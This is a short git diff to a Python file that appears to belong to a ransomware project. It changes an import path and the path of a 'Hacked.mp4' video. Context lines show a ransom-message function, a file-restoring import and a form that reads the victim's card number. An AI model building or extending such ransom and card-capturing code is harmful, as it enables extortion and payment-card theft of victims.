@@ -1,7 +1,8 @@
 import cv2
 import tkinter as tk
 from tkinter import messagebox
-from restorer_ware import restore_files_in_directory 
+from encryption.restorer_ware import restore_files_in_directory
+
 
 def validate_and_submit(window,key):
     card_number = window.card_number_entry.get().strip()
@@ -113,6 +114,6 @@ def show_ransom_message(key):
 
 
 def Main(key):
-    video_path = "Hacked.mp4" 
+    video_path = "./encryption/Hacked.mp4" 
     play_video(video_path)
     show_ransom_message(key)
